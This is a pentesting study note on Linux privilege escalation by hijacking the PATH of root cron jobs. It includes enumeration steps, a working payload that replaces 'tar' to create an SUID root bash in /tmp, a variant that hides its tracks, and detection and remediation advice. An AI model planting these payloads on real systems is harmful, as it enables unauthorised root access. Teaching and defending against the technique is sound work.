---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.10 Cron Job Abuse PATH"
---

# Cron Job Abuse: PATH Hijacking

## Executive Summary

PATH hijacking in the context of cron jobs is a sophisticated privilege escalation technique that exploits how the system resolves command names to executable files. The `PATH` environment variable dictates the directories the shell searches when a user executes a command without providing an absolute path (e.g., typing `tar` instead of `/bin/tar`). When a cron job runs a script as `root`, and that script executes commands using relative names, the script relies on the cron environment's `PATH`. If an attacker can write to a directory that appears earlier in that `PATH` variable than the directory containing the legitimate binary, they can create a malicious executable with the same name. When the cron job executes, it will inadvertently run the attacker's binary with `root` privileges.

## The Vulnerability: Environment Variables and Relative Paths

The vulnerability is a combination of two bad practices:
1.  **Defining a loose PATH in cron:** The crontab file defines a `PATH` that includes directories writable by unprivileged users (e.g., `/tmp`, or a shared user directory).
2.  **Using relative paths in scripts:** The script executed by the cron job calls utilities (like `cp`, `tar`, `make`, `grep`) without specifying their full absolute paths.

### How Cron Sets the Environment

Unlike a standard interactive login session, cron runs jobs in a highly restricted environment. By default, it does not source `/etc/profile` or `~/.bashrc`. Instead, the environment is defined directly at the top of the crontab file.

A vulnerable `/etc/crontab` might look like this:

```bash
SHELL=/bin/sh
PATH=/home/user/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
* * * * * root /opt/scripts/backup.sh
```

In this example, `/home/user/bin` is the first directory in the `PATH`. If the `backup.sh` script contains the command `tar -czvf /backup/data.tar.gz /data`, the system will search for the `tar` executable in the following order:
1.  `/home/user/bin/tar`
2.  `/usr/local/sbin/tar`
3.  `/usr/local/bin/tar`
...and so on.

If the attacker controls the `user` account, they can create a malicious script named `tar` in `/home/user/bin/`, and it will be executed instead of the legitimate `/bin/tar`.

## Attack Flow Architecture

```ascii
+-----------------------------------+
|  Vulnerable Cron Configuration    |
|  PATH=/tmp:/bin:/usr/bin          |
|  Command: root /opt/backup.sh     |
+-----------------------------------+
                 |
                 | Cron executes job
                 v
+-----------------------------------+
|  /opt/backup.sh executing...      |
|  Contains command: `tar -cf ...`  |
+-----------------------------------+
                 |
                 | Resolving 'tar'
                 v
+-----------------------------------+        +-----------------------------------+
|  Check PATH Directory 1: /tmp     | -----> |  Attacker placed malicious 'tar'  |
|  Does /tmp/tar exist? YES!        |        |  Execution Hijacked! (uid=0)      |
+-----------------------------------+        +-----------------------------------+
                 |                                           |
                 | If No...                                  | Attacker executes reverse shell
                 v                                           v
+-----------------------------------+        +-----------------------------------+
|  Check PATH Directory 2: /bin     |        |  Attacker Listener on Port 4444   |
|  Executes legitimate /bin/tar     |        |  <-- Connection Received          |
+-----------------------------------+        +-----------------------------------+
```

## Exploitation Phase

The exploitation process requires identifying the cron job, reading the `PATH` variable, finding a writable directory in that path, and planting the malicious payload.

### Step 1: Enumeration

1.  **Read the Crontab:**
    Examine `/etc/crontab` and files in `/etc/cron.d/`.
    ```bash
    cat /etc/crontab
    ```
    Look specifically for the `PATH=` definition and note the directories.

2.  **Identify Writable Directories:**
    Check if any of the directories in the defined `PATH` are writable by your user.
    ```bash
    ls -lah -d /home/user/bin
    # Or, if /tmp is in the PATH:
    ls -lah -d /tmp
    ```

3.  **Analyze the Target Script:**
    Examine the script executed by the cron job (e.g., `/opt/scripts/backup.sh`) to find commands executed without absolute paths.
    ```bash
    cat /opt/scripts/backup.sh
    #!/bin/bash
    cd /var/www/html
    tar -czf /var/backups/html.tar.gz .
    ```
    Here, `tar` is called relatively.

### Step 2: Creating the Malicious Binary

Once you know the relative command being called (`tar`) and a writable directory in the `PATH` (`/home/user/bin`), you can create your payload.

1.  **Write the Payload:**
    Create a file with the same name as the target command in the writable directory.
    ```bash
    cat << EOF > /home/user/bin/tar
    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash
    EOF
    ```

2.  **Make it Executable:**
    The malicious file must have the execute permission set.
    ```bash
    chmod +x /home/user/bin/tar
    ```

### Step 3: Privilege Escalation

Wait for the cron job to execute. Because `/home/user/bin` is evaluated before `/bin`, the system will execute your malicious `tar` script as root.

Once the minute passes, check for the result of your payload.
```bash
ls -l /tmp/rootbash
-rwsr-sr-x 1 root root 1.1M Jun  9 12:00 /tmp/rootbash

/tmp/rootbash -p
# id
uid=1000(user) euid=0(root) gid=1000(user)
```

## Edge Cases & Troubleshooting

### Hidden Cron Jobs (pspy)
If the cron job is not visible in `/etc/crontab`, you can use `pspy` to capture the execution of cron jobs. `pspy` might show the commands being executed, allowing you to guess the `PATH` or see which relative commands are used. However, without knowing the explicit `PATH` set in the hidden crontab, hijacking is significantly harder and often relies on guessing standard writable paths like `/tmp` if it's erroneously included.

### Payload Execution Blockers
If the malicious script runs but fails to create the SUID binary, ensure the script explicitly defines its own shell `#!/bin/bash` at the top. Cron environments are limited, and failing to specify the interpreter can cause execution failures.

### System Destabilization
By hijacking a core command like `tar`, you break the original functionality of the script. The backup will fail. In a real-world scenario, a sophisticated attacker would ensure their payload *also* executes the legitimate command to avoid detection.
```bash
#!/bin/bash
# Malicious action
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
# Legitimate action to hide tracks
/bin/tar "$@"
```

## Detection and Forensics

1.  **Crontab Auditing:** Regularly audit `/etc/crontab` and `/etc/cron.d/` for unusual `PATH` variables. Writable directories like `/tmp`, `/var/tmp`, or user home directories should *never* be in the system cron `PATH`.
2.  **Process Monitoring:** Monitor child processes spawned by cron. A cron job intended to run a backup script should spawn `tar` or `gzip`. If it spawns `bash` which then executes `chmod +s`, an EDR/SIEM should flag this behavior immediately.
3.  **File Creation Monitoring:** Monitor for the creation of executable files in user directories that match the names of standard system binaries (`tar`, `cp`, `make`).

## Remediation

1.  **Secure the PATH:** Ensure the `PATH` variable in all crontabs only includes secure, root-owned directories (`/bin:/sbin:/usr/bin:/usr/sbin`). Remove any world-writable or user-writable directories.
2.  **Use Absolute Paths:** Modify all scripts executed by cron to use absolute paths for all commands.
    *   *Bad:* `tar -czf ...`
    *   *Good:* `/bin/tar -czf ...`
3.  **Principle of Least Privilege:** Run the cron job as the lowest privileged user necessary for the task, rather than defaulting to root.

## Chaining Opportunities

*   **[[09 - Cron Job Abuse Writable Scripts]]**: If the script itself is writable, you don't need to hijack the PATH; you can just write directly into the script.
*   **[[11 - PATH Environment Variable Hijacking]]**: This concept is identical to general PATH hijacking, but applied specifically within the restricted context of the cron daemon.
*   **[[18 - SUID Executables]]**: The payload used in PATH hijacking often involves creating a SUID binary to maintain persistent root access after the cron job finishes execution.

## Related Notes
*   [[01 - Linux Privilege Escalation Fundamentals]]
*   [[11 - PATH Environment Variable Hijacking]]
*   [[09 - Cron Job Abuse Writable Scripts]]
*   [[18 - SUID Executables]]
